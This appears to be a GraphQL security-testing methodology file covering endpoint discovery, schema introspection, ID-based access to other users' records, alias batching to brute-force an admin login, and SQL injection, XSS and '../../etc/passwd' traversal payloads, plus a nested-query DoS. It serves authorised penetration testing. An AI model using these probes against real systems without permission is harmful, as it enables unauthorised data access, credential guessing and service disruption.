---
name: graphql
description: GraphQL security testing methodology covering introspection abuse, IDOR via query manipulation, batching attacks, injection via arguments, and subscription abuse.
version: 1.0.0
license: Apache-2.0
---

# GraphQL Security Testing

## Attack Surface

GraphQL endpoints expose a flexible query language that commonly introduces: unauthorized object access via ID manipulation, schema disclosure via introspection, DoS via deeply nested/batched queries, injection via unparameterised arguments, and information disclosure via verbose errors.

## Methodology

### Phase 1 — Discover and fingerprint

```
Common endpoints: /graphql, /api/graphql, /query, /gql, /v1/graphql
Test with: { __typename }
Check for: GraphiQL IDE exposed in production
```

### Phase 2 — Introspection (schema extraction)

```graphql
query IntrospectionQuery {
  __schema {
    types { name kind fields { name type { name kind ofType { name kind } } } }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}
```

Extract all queries, mutations, types, and field names. Build a complete map of the API surface.

```bash
# Automated with InQL or graphql-voyager
inql -t http://target/graphql
```

### Phase 3 — IDOR via ID manipulation

```graphql
# Test integer IDs
query { user(id: 1) { email, role, balance } }
query { user(id: 2) { email, role, balance } }  # another user's data

# Test UUID enumeration
query { order(id: "550e8400-e29b-41d4-a716-446655440000") { total, items } }
```

### Phase 4 — Batching attacks (rate limit bypass, brute force)

```graphql
# Alias batching — send 100 requests in one HTTP call
query {
  a1: login(username: "admin", password: "password1") { token }
  a2: login(username: "admin", password: "password2") { token }
  ...
  a100: login(username: "admin", password: "password100") { token }
}
```

### Phase 5 — Injection via arguments

```graphql
query { user(id: "1 UNION SELECT...") { name } }       # SQLi
query { search(term: "<script>alert(1)</script>") { results } }  # XSS
query { file(path: "../../etc/passwd") { content } }   # Path traversal
```

### Phase 6 — Introspection bypass attempts

If introspection is disabled:
```graphql
# Try field suggestion (Cleopatra attack) — GraphQL suggests valid field names
query { __typename @deprecated }
query { user { __typename } }  # partial schema disclosure via errors
```

### Phase 7 — DoS via query complexity

```graphql
# Deep nesting
query { user { friends { friends { friends { friends { name email } } } } } }
```

## Tools

- [InQL](https://github.com/nicowillis/inql) — Burp extension + CLI
- [graphql-voyager](https://github.com/graphql-kit/graphql-voyager) — schema visualiser
- [BatchQL](https://github.com/nicholasaleks/batchql) — batching attack scanner
- [graphw00f](https://github.com/dolevf/graphw00f) — GraphQL fingerprinting

## OWASP Top 10 Mapping

- A01:2021 — Broken Access Control (IDOR)
- A03:2021 — Injection
